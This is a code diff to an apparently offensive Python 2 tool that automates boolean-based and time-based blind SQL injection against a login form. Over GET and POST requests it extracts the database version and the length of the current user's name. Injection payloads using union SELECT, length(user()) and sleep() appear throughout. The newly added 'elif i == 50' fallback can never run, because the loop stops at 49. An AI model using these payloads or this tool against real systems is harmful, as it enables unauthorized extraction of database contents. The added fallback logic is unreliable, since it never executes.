@@ -234,7 +234,6 @@ class SqliTest(BaseConfig):
                 # 先注version长度
                 logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                 logger.debug("Start version length sqli...")
-                # logger.debug("Start version length sqli payload Queue build...")
                 for i in trange(30, desc="Version length sqli...", leave=False):
                     # payload = "user=user1' %26%26 (select length(version())) > " + repr(
                     #     i) + " %26%26 '1'='1&passwd=ddog123&submit=Log+In"
@@ -277,7 +276,6 @@ class SqliTest(BaseConfig):
 
                 logger.debug("Version length sqli success...The version_len is %d..." % version_len)
                 print "[*] version_len: %d" % version_len
-                # logger.debug("Database length sqli payload Queue build success...")
 
                 # 再注version
                 logger.debug("Start version sqli...")
@@ -412,7 +410,7 @@ class SqliTest(BaseConfig):
                 logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                 logger.debug("Start user length sqli...")
                 # logger.debug("Start user length sqli payload Queue build...")
-                for i in trange(30, desc="User length sqli...", leave=False):
+                for i in trange(50, desc="User length sqli...", leave=False):
                     # payload = "user=user1' %26%26 (select length(user())) > " + repr(
                     #     i) + " %26%26 '1'='1&passwd=ddog123&submit=Log+In"
                     payload = self.dealpayload.construct_build_payload(
@@ -421,6 +419,9 @@ class SqliTest(BaseConfig):
                     if self.Data.GetBuildData(payload, self.len) == 0:
                         user_len = i
                         break
+                    elif i == 50:
+                        logger.error("user length > 50")
+                        user_len = 50
 
                 logger.debug("User length sqli success...The user_len is %d..." % user_len)
                 print "[*] user_len: %d" % user_len
@@ -445,12 +446,15 @@ class SqliTest(BaseConfig):
                 # 先注user长度
                 logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                 logger.debug("Start user length sqli...")
-                for i in trange(30, desc="User length sqli...", leave=False):
+                for i in trange(50, desc="User length sqli...", leave=False):
                     payload = "user=ddog123' union SELECT 1,if((select length(user()))>" + repr(
                         i) + ",sleep(" + repr(self.time) + "),0) %23"
                     if self.Data.GetTimeData(payload, self.time) == 0:
                         user_len = i
                         break
+                    elif i == 50:
+                        logger.error("user length > 50")
+                        user_len = 50
 
                 logger.debug("User length sqli success...The user_len is %d..." % user_len)
                 print "[*] user_len: %d" % user_len
@@ -497,7 +501,7 @@ class SqliTest(BaseConfig):
                 logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                 logger.debug("Start user length sqli...")
                 # logger.debug("Start user length sqli payload Queue build...")
-                for i in trange(30, desc="User length sqli...", leave=False):
+                for i in trange(50, desc="User length sqli...", leave=False):
                     # payload = {"user": "user1' && (select length(user())) > " + repr(i) + " && '1'='1",
                     #            "passwd": "ddog123"}
                     payload = self.dealpayload.construct_build_payload(
@@ -506,6 +510,9 @@ class SqliTest(BaseConfig):
                     if self.Data.PostBuildData(payload, self.len) == 0:
                         user_len = i
                         break
+                    elif i == 50:
+                        logger.error("user length > 50")
+                        user_len = 50
 
                 logger.debug("User length sqli success...The user_len is %d..." % user_len)
                 print "[*] user_len: %d" % user_len
@@ -531,13 +538,16 @@ class SqliTest(BaseConfig):
                 # 先注user长度
                 logger.debug("The sqlimethod is %s..." % self.sqlimethod)
                 logger.debug("Start user length sqli...")
-                for i in trange(30, desc="User length sqli...", leave=False):
+                for i in trange(50, desc="User length sqli...", leave=False):
                     payload = {"user": "ddog123' union SELECT 1,if((select length(user()))>" + repr(
                         i) + ",sleep(" + repr(self.time) + "),0) #", "passwd": "ddog123"}
                     # payload = "username=ddog123' && SELECT if((select length(user()))>" + repr(i) + ",sleep(" + self.time + "),0) && '1'='1&passwd=ddog123&submit=Log+In"
                     if self.Data.PostTimeData(payload, self.time) == 0:
                         user_len = i
                         break
+                    elif i == 50:
+                        logger.error("user length > 50")
+                        user_len = 50
 
                 logger.debug("user length sqli success...The user_len is %d..." % user_len)
                 print "[*] user_len: %d" % user_len
